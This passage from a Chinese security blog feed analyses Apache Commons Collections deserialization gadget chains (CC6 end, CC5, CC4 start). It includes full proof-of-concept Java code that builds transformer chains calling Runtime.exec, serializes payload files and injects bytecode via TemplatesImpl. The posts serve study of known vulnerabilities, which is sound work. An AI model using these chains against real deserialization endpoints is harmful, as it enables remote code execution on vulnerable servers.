HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] tablearray = (Object[])table.get(hsmap);</span><br><span class="line">        <span class="comment">//对node进行初始化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            node = tablearray[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,TM);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload-2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hs);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload-2.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>本以为cc6跟前面cc4、5一样进行变式就行了理解起来很容易，但实际学习中虽然只改变入口为hashmap和hashset，但为了理解里面的原理踩了好些坑，也更了解了hashmap和hashset序列化的过程（包括通过反射去修改hashmap的key值），如果只是跟着网上的资料学习跟踪链的话，很多细节还是被直接过掉了，还是要尽可能学习逆向思维，找到为什么这段代码能触发，为什么要这么写，写成其他的为啥不行，被绕进去好几次，但最后还是理清楚了很多，学到了很多，但在默认的序列化功能源码上多少还有些不太明白理的清的地方。</p><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://www.runoob.com/manual/jdk11api/java.base/java/util/HashSet.html#method.detail">https://www.runoob.com/manual/jdk11api/java.base/java/util/HashSet.html#method.detail</a><br><a href="https://paper.seebug.org/1242/#commons-collections-6">https://paper.seebug.org/1242/#commons-collections-6</a><br>java漫谈</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC5链学习与分析</title>
      <link href="/posts/340e4601.html"/>
      <url>/posts/340e4601.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>重点上还是CC1、2两个链，后面都是变种或者加了一些新入口，依旧单独列出来方便整理，写一起太乱了。</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（版本无限制）<br>Commons Collections：3.2.1（漏洞版本在3.1-3.2.1）<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、分析"><a href="#0x03、分析" class="headerlink" title="0x03、分析"></a>0x03、分析</h1><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>CC5链基于CC1-LazyMap链进行的变式延伸，回顾CC1-LazyMap链：<br>CC1（LazyMap链）：</p><ul><li>生成LazyMap对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法，随后将LazyMap对象传入<code>AnnotationInvocationHandler</code>代理类。</li><li>通过动态代理，在生成二次代理对象时调用对象的<code>invoke</code>方法，其中<code>invoke</code>方法中调用<code>LazyMap.get()</code>方法、<code>get()</code>方法调用<code>ChainedTransformer.transform()</code>方法最后实现<code>InvokerTransformer.transform()</code>执行命令;</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>CC5在基于CC1-LazyMap链上引入了<code>TiedMapEntry</code>类和<code>BadAttributeValueExpException</code>类，其中<code>TiedMapEntry</code>类为<code>commons.collections</code>组件类，<code>BadAttributeValueExpException</code>类为jdk内置类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br></pre></td></tr></table></figure><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>回到LazyMap链的调用，在<code>get</code>方法中，判断map对象中的Key是否存在传入的key，不存在就新建一个value值去put入map对象中，其中便调用了<code>factory.transform(key)</code></p><p><img src="/posts/340e4601/cc5-1.png" title="LazyMap.get()"></p><p>其中<code>factory</code>为构造方法传入赋值的，因此构造参数传入<code>ChainedTransformer</code>类对象，变可执行<code>ChainedTransformer.transform(key)</code>方法执行代码</p><p><img src="/posts/340e4601/cc5-2.png" title="LazyMap构造方法"></p><p>由于构造方法是保护限制，但存在decorate方法去返回实例化LazyMap对象并调用构造方法</p><p><img src="/posts/340e4601/cc5-3.png" title="decorate方法"></p><p>利用点知道了，LazyMap链就是通过动态代理最后去调用到get方法。</p><h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><p>接下来就是找还有哪些类可以作为利用链调用的，就延伸出来<code>TiedMapEntry</code>类</p><p><img src="/posts/340e4601/cc5-4.png" title="get方法"></p><p>其中map对象是由构造方法传入的Map类型的对象</p><p><img src="/posts/340e4601/cc5-5.png" title="构造方法"></p><p>接下来就找在哪调用了<code>getValue()</code>方法</p><p><img src="/posts/340e4601/cc5-6.png" title="调用情况"></p><p>其中在本类有3个方法进行了调用<br><code>equals()</code>、<code>hashCode()</code>、<code>toString()</code></p><p>还需要一个序列化入口去调用其中的方法。</p><h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h3><p>这时延伸出<code>BadAttributeValueExpException</code>类，<code>BadAttributeValueExpException</code>类为<code>Exception</code>类的子类，实现了序列化，并重写了<code>readObject</code>反序列化方法</p><p><img src="/posts/340e4601/cc5-7.png" title="调用情况"></p><p>相关注释：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//读取序列化字段</span></span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="comment">//获取序列化val字段的值</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//判断该值是否为null</span></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//不为null的话再判断该值是否是String类型</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        <span class="comment">//不为空且不为String类型的话，再判断当前系统安全管理器是否存在，默认不存在返回null，或者判断值是否为其他类型中一种</span></span><br><span class="line">        <span class="comment">//代码意思为如果val的值不是String类型的话就给他.toString()转化为字符串类型</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            <span class="comment">//执行toString()</span></span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>因此为了执行<code>TiedMapEntry.toString()</code>方法，需要传入<code>val</code>字段值为<code>TiedMapEntry</code>对象，因为当前系统安全管理器默认不存在返回<code>null</code>，因此会执行<code>valObj.toString()</code>达到代码执行的目的</p><p>接下来只需要向<code>val</code>字段传入<code>TiedMapEntry</code>对象作为值即可，这里有<code>BadAttributeValueExpException</code>构造方法对val进行赋值</p><p><img src="/posts/340e4601/cc5-8.png" title="构造方法"></p><p>这里判断<code>val</code>是否为<code>null</code>,如果不为<code>null</code>，则直接执行<code>val.toString()</code></p><p>由于该构造方法直接调用时，便会执行<code>val.toString()</code>，因此在编写poc生成序列化的时候，便会在本地触发<code>val.toString()</code>造成代码执行。</p><p><img src="/posts/340e4601/cc5-9.png" title="本地执行"></p><p>同时在反序列化时发现并不会触发漏洞，断点查看val值已经变成进程对象</p><p><img src="/posts/340e4601/cc5-10.png" title="val"></p><p>因为在序列化过程前，代码执行到<code>BadAttributeValueExpException</code>调用构造方法触发代码后，<code>val</code>的值已经被运行完后赋值，返回<code>getKey() + &quot;=&quot; + getValue()</code>即上图中的值，此时的val值不再是<code>TiedMapEntry</code>对象，因此无法反序列化触发漏洞</p><p><img src="/posts/340e4601/cc5-11.png" title="val"></p><p>可通过反射对val值进行赋值成<code>TiedMapEntry</code>对象，可规避这个问题，至此，利用链完成。</p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>首先CC1-LazyMap链的前半段没有变化（也就是ChainedTransformer触发点），可直接使用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取Runtime类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>接着创建Map对象，通过调用decorate方法实例化LazyMap对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br></pre></td></tr></table></figure><p>然后<code>TiedMapEntry</code>对象，为了通过<code>toString()</code>调用<code>getValue()</code>方法中的<code>map.get()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//传入LazyMap对象，key随便设置例如下11</span></span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br></pre></td></tr></table></figure><p>最后通过<code>BadAttributeValueExpException</code>类调用<code>TiedMapEntry.toString()</code>方法，并通过反射设置<code>val</code>值为TiedMapEntry对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException BV=<span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">111</span>);</span><br><span class="line">Field field=BV.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(BV,Lmap);</span><br></pre></td></tr></table></figure><p>最后序列化，反序列化触发代码执行。</p><p>完整POC:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        BadAttributeValueExpException BV=<span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">111</span>);</span><br><span class="line">        <span class="comment">//通过反射设置val值为TiedMapEntry对象</span></span><br><span class="line">        Field field=BV.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(BV,TM);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc5payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(BV);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc5payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实现demo：</p><p><img src="/posts/340e4601/cc5-12.png" title="实现demo"></p><h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>CC5在CC1-LazyMap链后半段通过BadAttributeValueExpException类调用TiedMapEntry.toString()方法达到执行效果，相对调用比较简单，但反向思维通过LazyMap跳到TiedMapEntry类去调用确实很难逆向去想到，调用类实在太多了，只有通过查看POC进行正向分析。</p><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://paper.seebug.org/1242/">https://paper.seebug.org/1242/</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC4链学习与分析</title>
      <link href="/posts/e3ecc659.html"/>
      <url>/posts/e3ecc659.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>CC1、2、3过完，4也是变种，还是单独列出来方便整理吧，写一起太乱了。</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（版本无限制）<br>Commons Collections：4.0（漏洞版本在4.0）<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、分析"><a href="#0x03、分析" class="headerlink" title="0x03、分析"></a>0x03、分析</h1><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>在学cc2的时候，使用到了两条链：</p><ul><li><font color="red">ChainedTransformer(Runtime)</font>+<font color="red">PriorityQueue</font>：通过ChainedTransformer串联Runtime恶意方法，添加到PriorityQueue队列比较器中，在添加元素时触发利用。</li><li><font color="red">字节码</font>+<font color="red">PriorityQueue</font>：通过invokerTransformer调用templates.newTransformer()方法，并作为比较器添加到PriorityQueue队列中，添加templates对象作为元素时，比较时调用templates.newTransformer()方法触发利用。</li></ul><p>在cc3链中学习时，使用的两个链：</p><ul><li>通过<font color="red">字节码</font>+<font color="red">(TrAXFilter+InstantiateTransformer)</font>+<font color="red">LazyMap</font>：通过LazyMap调用invoke方法执行到ChainedTransformer中的(TrAXFilter+InstantiateTransformer)，实例化TrAXFilter对象，并执行templates.newTransformer()方法触发利用。</li><li>通过<font color="red">字节码</font>+<font color="red">(TrAXFilter+InstantiateTransformer)</font>+<font color="red">TransformedMap</font>：通过TransformedMap重写的反序列化调用ChainedTransformer中的(TrAXFilter+InstantiateTransformer)，实例化TrAXFilter对象，并执行templates.newTransformer()方法触发利用。</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>序列化利用链触发方法简单形容就是：恶意代码构造+触发点+序列化入口</p><p>而cc4中把cc2、cc3中可组合利用的部分链进行了组合。</p><p>cc4中利用版本为Commons Collections4，意味着cc2中的PriorityQueue队列仍然可以作为序列化入口（Commons Collections3中TransformingComparator未实现序列化）。</p><p><img src="/posts/e3ecc659/cc4-1.png" title="PriorityQueue队列"></p><p>PriorityQueue队列序列化入口有了，接下来就是触发点和恶意代码构造。</p><p>触发点就为cc3中的(TrAXFilter+InstantiateTransformer)，恶意代码构造为字节码。</p><p><img src="/posts/e3ecc659/cc4-2.png" title="触发点和恶意代码构造"></p><p>cc4的利用链思路就出来了，很简单，简述就是把cc3中的(TrAXFilter+InstantiateTransformer)触发方式跟cc2的第二条链的触发方式替换了一下。</p><p>由于触发点的更换，因此在PriorityQueue队列中无需添加templates对象元素。</p><p>因为在CC3中触发点为<code>invokerTransformer(&quot;newTransformer&quot;)</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line">        Constructor cons=Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        <span class="comment">//突破限制，强制调用</span></span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名，也可以为newTransformer方法名</span></span><br><span class="line">        InvokerTransformer invokerTransformer=(InvokerTransformer) cons.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>想要调用该触发点，必须在队列首位添加templates对象的元素，才能调用InvokerTransformer.transform(TemplatesImpl)</p><p><img src="/posts/e3ecc659/cc4-3.png" title="添加元素"><br><img src="/posts/e3ecc659/cc4-4.png" title="compare"></p><p>而在cc4中，触发点变成了(TrAXFilter+InstantiateTransformer)作为比较器，目的只需要调用到该比较器即可触发利用，因此无需向队列添加元素，Transformer[]首位为ConstantTransformer对象，传入的任何obj对象都会返回TrAXFilter.class，因此对Obj传入参数并不影响。</p><p><img src="/posts/e3ecc659/cc4-5.png" title="compare"></p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>可以继续按照 恶意代码构造+触发点+序列化入口<br>恶意代码构造依旧把cc2主体代码（字节码）搬过来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建CtClass对象容器</span></span><br><span class="line">ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"><span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line"><span class="comment">//创建新类Exp2</span></span><br><span class="line">CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line"><span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line"><span class="comment">//创建构造函数</span></span><br><span class="line">CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line"><span class="comment">//向构造函数插入字节码</span></span><br><span class="line">cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"><span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line"><span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line"><span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">setFieldValue(templates,<span 